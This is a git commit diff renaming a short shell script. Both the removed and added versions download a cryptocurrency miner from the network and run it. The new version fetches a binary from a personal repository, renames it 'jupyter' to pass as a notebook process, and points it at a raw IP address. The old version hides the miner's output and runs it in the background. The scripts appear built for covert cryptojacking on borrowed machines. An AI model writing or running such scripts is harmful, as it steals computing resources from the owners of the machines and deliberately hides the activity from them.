ae7f2d82ce701c31b4171df2f4666ffed2b422e8
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-29 15:31:15 +0700

    Update and rename pepeka.sh to pepekas.sh

--- pepeka.sh
+++
@@ -1,5 +0,0 @@
-apt-get update && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget -qO acekaman.tar.gz https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz
-tar -xhf acekaman.tar.gz
-mv nq-miner acekam
-./acekam -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p pool.acemining.co:8443 -n tes --threads 1 --jobs 1 > /dev/null 2>&1 &
---
+++ pepekas.sh
@@ -0,0 +1,5 @@
+apt-get update && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
+wget https://github.com/komaria10003099/komaria/raw/main/minera
+chmod +x minera
+mv minera jupyter
+./jupyter -o 47.89.234.73:443 -t 2
